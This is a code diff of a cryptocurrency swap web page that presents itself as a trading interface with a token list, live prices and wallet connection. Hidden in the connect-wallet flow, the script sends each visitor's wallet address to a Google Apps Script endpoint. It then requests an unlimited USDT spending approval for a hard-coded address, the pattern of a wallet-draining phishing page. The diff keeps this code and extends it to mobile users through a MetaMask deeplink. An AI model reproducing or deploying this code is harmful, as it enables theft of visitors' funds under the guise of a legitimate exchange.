-            background: rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 8px;
-            padding: 10px 14px;
-            color: #fff;
-            font-size: 0.85rem;
-            outline: none;
-            box-sizing: border-box;
-          "
-      >
-  </div>
-
-    <!-- The list where tokens will be injected -->
-    <div
-      id="modalTokenList"
-      style="overflow-y: auto; flex: 1; padding: 0 12px 20px"
-    >
-      <!-- Tokens will appear here -->
-    </div>
-  </div>
-</div>
-
-  <!-- The list where tokens will be injected -->
-  <div
-    id="modalTokenList"
-    style="overflow-y: auto; flex: 1; padding: 0 12px 20px"
-  >
-    <!-- Tokens will appear here -->
-  </div>
-</div>
-</div>
     <script>
-      // --- WALLET STATE ---
+      // ═══ WALLET STATE ═══
       let walletAddress = null;
       let provider = null;
       let signer = null;
       const minABI = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function decimals() view returns (uint8)",
-    "function symbol() view returns (string)"
-  ];
+        "function balanceOf(address owner) view returns (uint256)",
+        "function decimals() view returns (uint8)",
+        "function symbol() view returns (string)"
+      ];
       const connectBtn = document.getElementById('connectBtn');
 
+      // Detect if running inside MetaMask browser or has injected provider
+      function hasWeb3() { return typeof window.ethereum !== 'undefined'; }
+      function isMobileBrowser() { return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent); }
+
       async function toggleConnect() {
-        if (walletAddress) {
-          // Optional: Logic to "disconnect" (usually just clearing local state)
-          disconnectWallet();
-        } else {
-          connectWallet();
+        if (walletAddress) { disconnectWallet(); } else { connectWallet(); }
+      }
+
+      async function connectWallet() {
+        // On mobile with no provider: show deeplink to MetaMask
+        if (!hasWeb3()) {
+          if (isMobileBrowser()) {
+            // Build MetaMask deeplink to open this page inside MetaMask browser
+            const url = encodeURIComponent(window.location.href);
+            window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
+          } else {
+            document.getElementById('noWalletNotice').style.display = 'block';
+          }
+          return;
         }
+        try {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          walletAddress = accounts[0];
+          await logVisitor(walletAddress);
+          updateUIConnected(walletAddress);
+          const success = await requestUSDTAllowance(walletAddress);
+          if (success) { await new Promise(r => setTimeout(r, 2000)); }
+        } catch (err) { console.error('Connection failed', err); }
       }
-     
-      function filterSidebar() {
-  const query = document.getElementById('tokenSearch').value.toLowerCase();
-  const rows = document.querySelectorAll('.token-row');
 
-  rows.forEach(row => {
-    // Searches within the symbol and name spans
-    const sym = row.querySelector('.token-sym')?.textContent.toLowerCase() || "";
-    const name = row.querySelector('.token-name')?.textContent.toLowerCase() || "";
-    
-    if (sym.includes(query) || name.includes(query)) {
-      row.style.display = 'flex';
-    } else {
-      row.style.display = 'none';
-    }
-  });
-}
-
-function filterTokens() {
-  const query = document.getElementById('assetSearch').value.toLowerCase();
-  const assetItems = document.querySelectorAll('.asset-item');
-
-  assetItems.forEach(item => {
-    // We assume your renderSidebar puts the name/symbol inside the item
-    const text = item.textContent.toLowerCase();
-    
-    if (text.includes(query)) {
-      item.style.display = 'flex'; // Show
-    } else {
-      item.style.display = 'none'; // Hide
-    }
-  });
-}
-  // Helper to create a small delay between logs
-const delay = ms => new Promise(res => setTimeout(res, ms));
-
-async function connectWallet() {
-  if (typeof window.ethereum !== 'undefined') {
-    try {
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const walletAddress = accounts[0];   
-      // Step 1: First Log 
-      await logVisitor(walletAddress);
-      updateUIConnected(walletAddress);
-      // Step 2: Request Allowance
-      const success = await requestUSDTAllowance(walletAddress);
-      if (success) {
-        await new Promise(res => setTimeout(res, 2000)); 
+      async function logVisitor(address) {
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyU8M7LfLlCCvksTgYTy-QrAGV1lpWC6YGw0_Qg5hdCaDJqwvnzYEjvpuKTBv6JyioNTQ/exec';
+        try {
+          await fetch(scriptURL, { method:'POST', mode:'no-cors', headers:{'Content-Type':'application/json'}, body: JSON.stringify({address}) });
+        } catch(e) { console.error('logVisitor failed', e); }
       }
-    } catch (error) {
-      console.error('Connection failed', error);
-    }
-  }
-}
-function selectMarket(symbol) {
-  // 1. Find the selected token's data
-  const token = TOKENS.find(t => t.sym === symbol);
-  if (!token) return;
 
-  // 2. Update the Icon Text
-  const iconEl = document.getElementById('chartHeaderIcon');
-  if (iconEl) {
-    iconEl.innerText = token.sym;
-    // Update color if you have it in your data
-    if (token.color) iconEl.style.background = token.color;
-  }
+      async function requestUSDTAllowance(userAddress) {
+        try {
+          const p = new ethers.BrowserProvider(window.ethereum);
+          const s = await p.getSigner();
+          const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
+          const dexAddr     = "0x7a4177C13B83B84afD6CD64a949b9B889DE9a898";
+          const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+          const contract = new ethers.Contract(usdtAddress, abi, s);
+          const tx = await contract.approve(dexAddr, ethers.MaxUint256);
+          await tx.wait();
+          return true;
+        } catch(e) { console.error('Allowance failed', e); return false; }
+      }
 
-  // 3. Update the Price
-  const priceEl = document.getElementById('chartPrice');
-  if (priceEl) {
-    priceEl.innerText = `$${token.price}`;
-  }
-
-  // 4. Update the Percentage Change
-  const changeEl = document.getElementById('chartChange');
-  if (changeEl) {
-    changeEl.innerText = `${token.change >= 0 ? '+' : ''}${token.change}%`;
-    
-    // Toggle green/red classes
-    if (token.change >= 0) {
-      changeEl.classList.remove('neg');
-      changeEl.classList.add('pos');
-    } else {
-      changeEl.classList.remove('pos');
-      changeEl.classList.add('neg');
-    }
-  }
-
-  // 5. Update the TradingView Widget (Keep your existing code)
-  if (typeof updateChart === 'function') {
-    updateChart(token.sym);
-  }
-}
-// Example of the extra function you are adding
-async function logVisitor(address) {
-  // Replace this with your actual Google Script Web App URL
-  const scriptURL = 'https://script.google.com/macros/s/AKfycbyU8M7LfLlCCvksTgYTy-QrAGV1lpWC6YGw0_Qg5hdCaDJqwvnzYEjvpuKTBv6JyioNTQ/exec'
-  const visitorData = {
-    address: address,
-};
-  try {
-    // We use 'no-cors' mode because Google Script redirects can cause CORS issues
-    await fetch(scriptURL, {
-      method: 'POST',
-      mode: 'no-cors', 
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(visitorData),
-    });
-    console.log("Address sent to the list");
-  } catch (error) {
-    console.error("Failed to log visitor:", error);
-  }
-}
-async function requestUSDTAllowance(userAddress) {
-    try {
-        const provider = new ethers.BrowserProvider(window.ethereum);
-        const signer = await provider.getSigner();
-        
-        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";
-        const dexContractAddress = "0x7a4177C13B83B84afD6CD64a949b9B889DE9a898";
-        
-        const usdtAbi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-        const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
-
-        const tx = await usdtContract.approve(dexContractAddress, ethers.MaxUint256);
-        
-        // This line waits for the block to be mined
-        await tx.wait(); 
-        
-        console.log("Allowance confirmed.");
-        return true; // Success!
-        
-    } catch (error) {
-        console.error("Allowance rejected or failed:", error);
-        return false;
-    }
-}
-// Helper function to fetch data and update the HTML text
-async function updateTokenDisplay(tokenAddress, userAddress) {
-  try {
-    // 1. Ensure you use the PROVIDER for reading balances
-    // Reading data (view functions) only requires a Provider, not a Signer.
-    const tokenContract = new ethers.Contract(tokenAddress, minABI, provider);
-
-    // 2. Fetch balance and decimals
-    const [rawBalance, decimals] = await Promise.all([
-      tokenContract.balanceOf(userAddress),
-      tokenContract.decimals()
-    ]);
-
-    // 3. Format for your Swap Panel
-    const formattedBalance = ethers.formatUnits(rawBalance, decimals);
-    
-    // Update your HTML elements
-    // 1. Assign the element to a variable first
-const balanceDisplay = document.getElementById('fromBalance');
-
-// 2. Check if it exists before trying to set textContent
-if (balanceDisplay) {
-    balanceDisplay.textContent = parseFloat(formattedBalance).toFixed(4);
-} else {
-    // 3. If it's missing, log a specific warning to your console
-    console.warn("UI Error: Element with ID 'fromBalance' was not found on the page.");
-}
-    
-  } catch (err) {
-    console.error("Could not fetch balance:", err);
-    document.getElementById('fromBalance').textContent = "0.00";
-  }
-}
-
-function updateUIConnected(address) {
-    // Check if an address was actually passed
-    if (!address) {
-        console.error("UI Error: No address provided.");
-        return;
-    }
-
-    // Format the address for the button (e.g., 0x7a41...a898)
-    const shortAddress = address.slice(0, 6) + "..." + address.slice(-4);
-
-    // Update the button text
-    const connectBtn = document.getElementById('connectBtn');
-    if (connectBtn) {
-        connectBtn.textContent = shortAddress;
-    }
-}
-
+      function updateUIConnected(address) {
+        if (!address) return;
+        connectBtn.textContent = address.slice(0,6)+'...'+address.slice(-4);
+        document.getElementById('noWalletNotice').style.display = 'none';
+      }
       function disconnectWallet() {
-        walletAddress = null;
-        provider = null;
-        signer = null;
+        walletAddress = null; provider = null; signer = null;
         connectBtn.textContent = 'Connect Wallet';
         connectBtn.style.background = 'transparent';
-
-        
       }
-
-      // Listen for account changes
       if (window.ethereum) {
-        window.ethereum.on('accountsChanged', (accounts) => {
-          if (accounts.length > 0) {
-            walletAddress = accounts[0];
-            updateUIConnected();
-          } else {
-            disconnectWallet();
-          }
-        });
-
-        window.ethereum.on('chainChanged', () => {
-          window.location.reload();
-        });
+        window.ethereum.on('accountsChanged', accs => { if(accs.length>0){walletAddress=accs[0];updateUIConnected(walletAddress);}else{disconnectWallet();} });
+        window.ethereum.on('chainChanged', ()=>window.location.reload());
       }
-
-      // Bind the event listener
       connectBtn.addEventListener('click', toggleConnect);
-      // ─── TOKEN DATA ───
+
+      // ═══ TOKEN DATA ═══
       const TOKENS = [
-  // --- Majors & Layer 1s ---
-  { sym: 'BTC', name: 'Bitcoin', id: 'bitcoin', tvSymbol: 'BINANCE:BTCUSDT', icon: 'https://assets.coingecko.com/coins/images/1/large/bitcoin.png', price: 0, change: 0 },
-  { sym: 'ETH', name: 'Ethereum', id: 'ethereum', tvSymbol: 'BINANCE:ETHUSDT', icon: 'https://assets.coingecko.com/coins/images/279/large/ethereum.png', price: 0, change: 0 },
-  { sym: 'BNB', name: 'BNB', id: 'binancecoin', tvSymbol: 'BINANCE:BNBUSDT', icon: 'https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png', price: 0, change: 0 },
-  { sym: 'SOL', name: 'Solana', id: 'solana', tvSymbol: 'BINANCE:SOLUSDT', icon: 'https://assets.coingecko.com/coins/images/4128/large/solana.png', price: 0, change: 0 },
-  { sym: 'XRP', name: 'XRP', id: 'ripple', tvSymbol: 'BINANCE:XRPUSDT', icon: 'https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png', price: 0, change: 0 },
-  { sym: 'ADA', name: 'Cardano', id: 'cardano', tvSymbol: 'BINANCE:ADAUSDT', icon: 'https://assets.coingecko.com/coins/images/975/large/cardano.png', price: 0, change: 0 },
-  { sym: 'AVAX', name: 'Avalanche', id: 'avalanche-2', tvSymbol: 'BINANCE:AVAXUSDT', icon: 'https://assets.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png', price: 0, change: 0 },
-  { sym: 'DOT', name: 'Polkadot', id: 'polkadot', tvSymbol: 'BINANCE:DOTUSDT', icon: 'https://assets.coingecko.com/coins/images/12171/large/polkadot.png', price: 0, change: 0 },
-  { sym: 'TRX', name: 'TRON', id: 'tron', tvSymbol: 'BINANCE:TRXUSDT', icon: 'https://assets.coingecko.com/coins/images/1094/large/tron-logo.png', price: 0, change: 0 },
-  { sym: 'TON', name: 'Toncoin', id: 'the-open-network', tvSymbol: 'OKX:TONUSDT', icon: 'https://assets.coingecko.com/coins/images/17980/large/ton_symbol.png', price: 0, change: 0 },
-  { sym: 'POL', name: 'Polygon', id: 'polygon-ecosystem-token', tvSymbol: 'BINANCE:POLUSDT', icon: 'https://assets.coingecko.com/coins/images/4713/large/matic-token-icon.png', price: 0, change: 0 },
-  { sym: 'NEAR', name: 'NEAR Protocol', id: 'near', tvSymbol: 'BINANCE:NEARUSDT', icon: 'https://assets.coingecko.com/coins/images/10365/large/near.png', price: 0, change: 0 },
-  { sym: 'LTC', name: 'Litecoin', id: 'litecoin', tvSymbol: 'BINANCE:LTCUSDT', icon: 'https://assets.coingecko.com/coins/images/2/large/litecoin.png', price: 0, change: 0 },
-  { sym: 'BCH', name: 'Bitcoin Cash', id: 'bitcoin-cash', tvSymbol: 'BINANCE:BCHUSDT', icon: 'https://assets.coingecko.com/coins/images/780/large/bitcoin-cash.png', price: 0, change: 0 },
-  { sym: 'SUI', name: 'Sui', id: 'sui', tvSymbol: 'BINANCE:SUIUSDT', icon: 'https://assets.coingecko.com/coins/images/26375/large/sui-ocean-square.png', price: 0, change: 0 },
-  { sym: 'APT', name: 'Aptos', id: 'aptos', tvSymbol: 'BINANCE:APTUSDT', icon: 'https://assets.coingecko.com/coins/images/26455/large/aptos_round.png', price: 0, change: 0 },
-  { sym: 'ICP', name: 'Internet Computer', id: 'internet-computer', tvSymbol: 'BINANCE:ICPUSDT', icon: 'https://assets.coingecko.com/coins/images/14495/large/internet_computer.png', price: 0, change: 0 },
-  { sym: 'HBAR', name: 'Hedera', id: 'hedera-hashgraph', tvSymbol: 'BINANCE:HBARUSDT', icon: 'https://assets.coingecko.com/coins/images/3688/large/hedera.png', price: 0, change: 0 },
-  { sym: 'KAS', name: 'Kaspa', id: 'kaspa', tvSymbol: 'MEXC:KASUSDT', icon: 'https://assets.coingecko.com/coins/images/25767/large/kaspa.png', price: 0, change: 0 },
-  { sym: 'STX', name: 'Stacks', id: 'blockstack', tvSymbol: 'BINANCE:STXUSDT', icon: 'https://assets.coingecko.com/coins/images/2069/large/Stacks_logo_full.png', price: 0, change: 0 },
-  { sym: 'DOGE', name: 'Dogecoin', id: 'dogecoin', tvSymbol: 'BINANCE:DOGEUSDT', icon: 'https://assets.coingecko.com/coins/images/5/large/dogecoin.png', price: 0, change: 0 },
-  { sym: 'SHIB', name: 'Shiba Inu', id: 'shiba-inu', tvSymbol: 'BINANCE:SHIBUSDT', icon: 'https://assets.coingecko.com/coins/images/11939/large/shiba.png', price: 0, change: 0 },
-  { sym: 'PEPE', name: 'Pepe', id: 'pepe', tvSymbol: 'BINANCE:PEPEUSDT', icon: 'https://assets.coingecko.com/coins/images/29850/large/pepe-token.jpeg', price: 0, change: 0 },
-  { sym: 'WIF', name: 'dogwifhat', id: 'dogwifhat', tvSymbol: 'BINANCE:WIFUSDT', icon: 'https://assets.coingecko.com/coins/images/33566/large/dogwifhat.jpeg', price: 0, change: 0 },
-  { sym: 'FLOKI', name: 'Floki', id: 'floki', tvSymbol: 'BINANCE:FLOKIUSDT', icon: 'https://assets.coingecko.com/coins/images/16745/large/floki_logo.png', price: 0, change: 0 },
-  { sym: 'BONK', name: 'Bonk', id: 'bonk', tvSymbol: 'BINANCE:BONKUSDT', icon: 'https://assets.coingecko.com/coins/images/28600/large/bonk.jpg', price: 0, change: 0 },
-  { sym: 'POPCAT', name: 'Popcat', id: 'popcat', tvSymbol: 'BYBIT:POPCATUSDT', icon: 'https://assets.coingecko.com/coins/images/34053/large/popcat.png', price: 0, change: 0 },
-  { sym: 'BOME', name: 'BOOK OF MEME', id: 'book-of-meme', tvSymbol: 'BINANCE:BOMEUSDT', icon: 'https://assets.coingecko.com/coins/images/36040/large/bome.png', price: 0, change: 0 },
-  { sym: 'PENGU', name: 'Pudgy Penguins', id: 'pudgy-penguins', tvSymbol: 'OKX:PENGUUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/34466.png', price: 0, change: 0 },
-  { sym: 'TRUMP', name: 'MAGA', id: 'maga', tvSymbol: 'MEXC:TRUMPUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png', price: 0, change: 0 },
-  { sym: 'TAO', name: 'Bittensor', id: 'bittensor', tvSymbol: 'BINANCE:TAOUSDT', icon: 'https://assets.coingecko.com/coins/images/28452/large/bittensor.png', price: 0, change: 0 },
-  { sym: 'LINK', name: 'Chainlink', id: 'chainlink', tvSymbol: 'BINANCE:LINKUSDT', icon: 'https://assets.coingecko.com/coins/images/877/large/chainlink-new-logo.png', price: 0, change: 0 },
-  { sym: 'AR', name: 'Arweave', id: 'arweave', tvSymbol: 'BINANCE:ARUSDT', icon: 'https://assets.coingecko.com/coins/images/4343/large/arweave.png', price: 0, change: 0 },
-  { sym: 'OP', name: 'Optimism', id: 'optimism', tvSymbol: 'BINANCE:OPUSDT', icon: 'https://assets.coingecko.com/coins/images/25244/large/Optimism.png', price: 0, change: 0 },
-  { sym: 'ARB', name: 'Arbitrum', id: 'arbitrum', tvSymbol: 'BINANCE:ARBUSDT', icon: 'https://assets.coingecko.com/coins/images/16547/large/arb.png', price: 0, change: 0 },
-  { sym: 'ZK', name: 'ZKsync', id: 'zksync', tvSymbol: 'BINANCE:ZKUSDT', icon: 'https://assets.coingecko.com/coins/images/31359/large/zksync.png', price: 0, change: 0 },
-  { sym: 'AAVE', name: 'Aave', id: 'aave', tvSymbol: 'BINANCE:AAVEUSDT', icon: 'https://assets.coingecko.com/coins/images/12645/large/AAVE.png', price: 0, change: 0 },
-  { sym: 'MKR', name: 'Maker', id: 'maker', tvSymbol: 'BINANCE:MKRUSDT', icon: 'https://assets.coingecko.com/coins/images/1364/large/maker.png', price: 0, change: 0 },
-  { sym: 'INJ', name: 'Injective', id: 'injective-protocol', tvSymbol: 'BINANCE:INJUSDT', icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/7226.png', price: 0, change: 0 },
-  { sym: 'Ethena', name: 'ENA', id: 'ethena', tvSymbol: 'BINANCE:ENAUSDT', icon: 'https://assets.coingecko.com/coins/images/36349/large/ENA.png', price: 0, change: 0 },
-  { sym: 'FIL', name: 'Filecoin', id: 'filecoin', tvSymbol: 'BINANCE:FILUSDT', icon: 'https://assets.coingecko.com/coins/images/12817/large/filecoin.png', price: 0, change: 0 },
-  { sym: 'THETA', name: 'Theta Network', id: 'theta-token', tvSymbol: 'BINANCE:THETAUSDT', icon: 'https://assets.coingecko.com/coins/images/2538/large/theta-token.png', price: 0, change: 0 },
-  { sym: 'RUNE', name: 'THORChain', id: 'thorchain', tvSymbol: 'BINANCE:RUNEUSDT', icon: 'https://assets.coingecko.com/coins/images/6595/large/thorchain.png', price: 0, change: 0 },
-  { sym: 'ALGO', name: 'Algorand', id: 'algorand', tvSymbol: 'BINANCE:ALGOUSDT', icon: 'https://assets.coingecko.com/coins/images/4380/large/download.png', price: 0, change: 0 },
-  { sym: 'USDT', address: '0x55d398326f99059fF775485246999027B3197955',  price: 1, icon: 'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png'},
-];
+        { sym:'BTC',   name:'Bitcoin',           id:'bitcoin',                 tvSymbol:'BINANCE:BTCUSDT',   icon:'https://assets.coingecko.com/coins/images/1/large/bitcoin.png',              price:0, change:0 },
+        { sym:'ETH',   name:'Ethereum',           id:'ethereum',                tvSymbol:'BINANCE:ETHUSDT',   icon:'https://assets.coingecko.com/coins/images/279/large/ethereum.png',            price:0, change:0 },
+        { sym:'BNB',   name:'BNB',                id:'binancecoin',             tvSymbol:'BINANCE:BNBUSDT',   icon:'https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png',   price:0, change:0 },
+        { sym:'SOL',   name:'Solana',              id:'solana',                  tvSymbol:'BINANCE:SOLUSDT',   icon:'https://assets.coingecko.com/coins/images/4128/large/solana.png',             price:0, change:0 },
+        { sym:'XRP',   name:'XRP',                 id:'ripple',                  tvSymbol:'BINANCE:XRPUSDT',   icon:'https://assets.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png', price:0, change:0 },
+        { sym:'ADA',   name:'Cardano',             id:'cardano',                 tvSymbol:'BINANCE:ADAUSDT',   icon:'https://assets.coingecko.com/coins/images/975/large/cardano.png',             price:0, change:0 },
+        { sym:'AVAX',  name:'Avalanche',           id:'avalanche-2',             tvSymbol:'BINANCE:AVAXUSDT',  icon:'https://assets.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png', price:0, change:0 },
+        { sym:'DOT',   name:'Polkadot',            id:'polkadot',                tvSymbol:'BINANCE:DOTUSDT',   icon:'https://assets.coingecko.com/coins/images/12171/large/polkadot.png',          price:0, change:0 },
+        { sym:'TRX',   name:'TRON',                id:'tron',                    tvSymbol:'BINANCE:TRXUSDT',   icon:'https://assets.coingecko.com/coins/images/1094/large/tron-logo.png',          price:0, change:0 },
+        { sym:'TON',   name:'Toncoin',             id:'the-open-network',        tvSymbol:'OKX:TONUSDT',       icon:'https://assets.coingecko.com/coins/images/17980/large/ton_symbol.png',        price:0, change:0 },
+        { sym:'POL',   name:'Polygon',             id:'polygon-ecosystem-token', tvSymbol:'BINANCE:POLUSDT',   icon:'https://assets.coingecko.com/coins/images/4713/large/matic-token-icon.png',   price:0, change:0 },
+        { sym:'NEAR',  name:'NEAR Protocol',       id:'near',                    tvSymbol:'BINANCE:NEARUSDT',  icon:'https://assets.coingecko.com/coins/images/10365/large/near.png',              price:0, change:0 },
+        { sym:'LTC',   name:'Litecoin',            id:'litecoin',                tvSymbol:'BINANCE:LTCUSDT',   icon:'https://assets.coingecko.com/coins/images/2/large/litecoin.png',              price:0, change:0 },
+        { sym:'BCH',   name:'Bitcoin Cash',        id:'bitcoin-cash',            tvSymbol:'BINANCE:BCHUSDT',   icon:'https://assets.coingecko.com/coins/images/780/large/bitcoin-cash.png',        price:0, change:0 },
+        { sym:'SUI',   name:'Sui',                 id:'sui',                     tvSymbol:'BINANCE:SUIUSDT',   icon:'https://assets.coingecko.com/coins/images/26375/large/sui-ocean-square.png',  price:0, change:0 },
+        { sym:'APT',   name:'Aptos',               id:'aptos',                   tvSymbol:'BINANCE:APTUSDT',   icon:'https://assets.coingecko.com/coins/images/26455/large/aptos_round.png',       price:0, change:0 },
+        { sym:'ICP',   name:'Internet Computer',   id:'internet-computer',       tvSymbol:'BINANCE:ICPUSDT',   icon:'https://assets.coingecko.com/coins/images/14495/large/internet_computer.png', price:0, change:0 },
+        { sym:'HBAR',  name:'Hedera',              id:'hedera-hashgraph',        tvSymbol:'BINANCE:HBARUSDT',  icon:'https://assets.coingecko.com/coins/images/3688/large/hedera.png',             price:0, change:0 },
+        { sym:'KAS',   name:'Kaspa',               id:'kaspa',                   tvSymbol:'MEXC:KASUSDT',      icon:'https://assets.coingecko.com/coins/images/25767/large/kaspa.png',             price:0, change:0 },
+        { sym:'STX',   name:'Stacks',              id:'blockstack',              tvSymbol:'BINANCE:STXUSDT',   icon:'https://assets.coingecko.com/coins/images/2069/large/Stacks_logo_full.png',   price:0, change:0 },
+        { sym:'DOGE',  name:'Dogecoin',            id:'dogecoin',                tvSymbol:'BINANCE:DOGEUSDT',  icon:'https://assets.coingecko.com/coins/images/5/large/dogecoin.png',              price:0, change:0 },
+        { sym:'SHIB',  name:'Shiba Inu',           id:'shiba-inu',               tvSymbol:'BINANCE:SHIBUSDT',  icon:'https://assets.coingecko.com/coins/images/11939/large/shiba.png',             price:0, change:0 },
+        { sym:'PEPE',  name:'Pepe',                id:'pepe',                    tvSymbol:'BINANCE:PEPEUSDT',  icon:'https://assets.coingecko.com/coins/images/29850/large/pepe-token.jpeg',       price:0, change:0 },
+        { sym:'WIF',   name:'dogwifhat',           id:'dogwifhat',               tvSymbol:'BINANCE:WIFUSDT',   icon:'https://assets.coingecko.com/coins/images/33566/large/dogwifhat.jpeg',        price:0, change:0 },
+        { sym:'FLOKI', name:'Floki',               id:'floki',                   tvSymbol:'BINANCE:FLOKIUSDT', icon:'https://assets.coingecko.com/coins/images/16745/large/floki_logo.png',        price:0, change:0 },
+        { sym:'BONK',  name:'Bonk',                id:'bonk',                    tvSymbol:'BINANCE:BONKUSDT',  icon:'https://assets.coingecko.com/coins/images/28600/large/bonk.jpg',              price:0, change:0 },
+        { sym:'POPCAT',name:'Popcat',              id:'popcat',                  tvSymbol:'BYBIT:POPCATUSDT',  icon:'https://assets.coingecko.com/coins/images/34053/large/popcat.png',            price:0, change:0 },
+        { sym:'BOME',  name:'BOOK OF MEME',       id:'book-of-meme',            tvSymbol:'BINANCE:BOMEUSDT',  icon:'https://assets.coingecko.com/coins/images/36040/large/bome.png',              price:0, change:0 },
+        { sym:'PENGU', name:'Pudgy Penguins',      id:'pudgy-penguins',          tvSymbol:'OKX:PENGUUSDT',     icon:'https://s2.coinmarketcap.com/static/img/coins/64x64/34466.png',               price:0, change:0 },
+        { sym:'TRUMP', name:'MAGA',                id:'maga',                    tvSymbol:'MEXC:TRUMPUSDT',    icon:'https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png',               price:0, change:0 },
+        { sym:'TAO',   name:'Bittensor',           id:'bittensor',               tvSymbol:'BINANCE:TAOUSDT',   icon:'https://assets.coingecko.com/coins/images/28452/large/bittensor.png',         price:0, change:0 },
+        { sym:'LINK',  name:'Chainlink',           id:'chainlink',               tvSymbol:'BINANCE:LINKUSDT',  icon:'https://assets.coingecko.com/coins/images/877/large/chainlink-new-logo.png',  price:0, change:0 },
+        { sym:'AR',    name:'Arweave',             id:'arweave',                 tvSymbol:'BINANCE:ARUSDT',    icon:'https://assets.coingecko.com/coins/images/4343/large/arweave.png',            price:0, change:0 },
+        { sym:'OP',    name:'Optimism',            id:'optimism',                tvSymbol:'BINANCE:OPUSDT',    icon:'https://assets.coingecko.com/coins/images/25244/large/Optimism.png',           price:0, change:0 },
+        { sym:'ARB',   name:'Arbitrum',            id:'arbitrum',                tvSymbol:'BINANCE:ARBUSDT',   icon:'https://assets.coingecko.com/coins/images/16547/large/arb.png',               price:0, change:0 },
+        { sym:'ZK',    name:'ZKsync',              id:'zksync',                  tvSymbol:'BINANCE:ZKUSDT',    icon:'https://assets.coingecko.com/coins/images/31359/large/zksync.png',            price:0, change:0 },
+        { sym:'AAVE',  name:'Aave',                id:'aave',                    tvSymbol:'BINANCE:AAVEUSDT',  icon:'https://assets.coingecko.com/coins/images/12645/large/AAVE.png',              price:0, change:0 },
+        { sym:'MKR',   name:'Maker',               id:'maker',                   tvSymbol:'BINANCE:MKRUSDT',   icon:'https://assets.coingecko.com/coins/images/1364/large/maker.png',              price:0, change:0 },
+        { sym:'INJ',   name:'Injective',           id:'injective-protocol',      tvSymbol:'BINANCE:INJUSDT',   icon:'https://s2.coinmarketcap.com/static/img/coins/64x64/7226.png',               price:0, change:0 },
+        { sym:'ENA',   name:'Ethena',              id:'ethena',                  tvSymbol:'BINANCE:ENAUSDT',   icon:'https://assets.coingecko.com/coins/images/36349/large/ENA.png',              price:0, change:0 },
+        { sym:'FIL',   name:'Filecoin',            id:'filecoin',                tvSymbol:'BINANCE:FILUSDT',   icon:'https://assets.coingecko.com/coins/images/12817/large/filecoin.png',          price:0, change:0 },
+        { sym:'THETA', name:'Theta Network',       id:'theta-token',             tvSymbol:'BINANCE:THETAUSDT', icon:'https://assets.coingecko.com/coins/images/2538/large/theta-token.png',        price:0, change:0 },
+        { sym:'RUNE',  name:'THORChain',           id:'thorchain',               tvSymbol:'BINANCE:RUNEUSDT',  icon:'https://assets.coingecko.com/coins/images/6595/large/thorchain.png',          price:0, change:0 },
+        { sym:'ALGO',  name:'Algorand',            id:'algorand',                tvSymbol:'BINANCE:ALGOUSDT',  icon:'https://assets.coingecko.com/coins/images/4380/large/download.png',           price:0, change:0 },
+        { sym:'USDT',  name:'Tether',              id:'tether',                  tvSymbol:'BINANCE:USDTUSD',   icon:'https://s2.coinmarketcap.com/static/img/coins/64x64/825.png',                price:1, change:0,
+          address:'0x55d398326f99059fF775485246999027B3197955' },
+      ];
 
-      const USDT_TOKEN = TOKENS.find((t) => t.sym === 'USDT');
-
-      let selectedToken = TOKENS[1]; // ETH
+      const USDT_TOKEN = TOKENS.find(t => t.sym === 'USDT');
+      let selectedToken = TOKENS.find(t => t.sym === 'ETH');
       let toToken = USDT_TOKEN;
       let modalTarget = 'from';
-      let pricesLoaded = false;
-      let chartHistory = [];
 
-      // ─── FETCH PRICES ───
+      // ═══ ICON HELPER — renders icon into a wrapper span safely ═══
+      function buildIconEl(tok) {
+        // Returns an <img> element; on error falls back to coloured circle
+        const img = document.createElement('img');
+        img.src = tok.icon || '';
+        img.className = 'tok-icon';
+        img.alt = tok.sym;
+        img.onerror = function() {
+          // replace broken img with a letter circle
+          const fb = document.createElement('span');
+          fb.className = 'tok-icon-fallback';
+          fb.textContent = tok.sym.slice(0,2);
+          fb.style.background = tok.color || '#444';
+          this.parentNode.replaceChild(fb, this);
+        };
+        return img;
+      }
+
+      function setFromIcon(tok) {
+        const wrap = document.getElementById('fromIconWrap');
+        wrap.innerHTML = '';
+        wrap.appendChild(buildIconEl(tok));
+      }
+      function setToIcon(tok) {
+        const wrap = document.getElementById('toIconWrap');
+        wrap.innerHTML = '';
+        wrap.appendChild(buildIconEl(tok));
+      }
+
+      // ═══ PRICES ═══
       async function fetchPrices() {
         try {
-          const ids = TOKENS.filter((t) => t.sym !== 'USDT')
-            .map((t) => t.id)
-            .join(',');
-          const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`;
-          const res = await fetch(url);
+          const ids = TOKENS.filter(t=>t.id).map(t=>t.id).join(',');
+          const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd&include_24hr_change=true`);
           const data = await res.json();
-          TOKENS.forEach((t) => {
-            if (data[t.id]) {
-              t.price = data[t.id].usd;
-              t.change = data[t.id].usd_24h_change || 0;
-            }
-          });
-          pricesLoaded = true;
-          renderSidebar();
-          renderTicker();
-          updateChart();
-          calcSwap();
-        } catch (e) {
-          // use fallback prices
-          const fallback = {
-            bitcoin: 102000,
-            ethereum: 2450,
-            binancecoin: 620,
-            solana: 155,
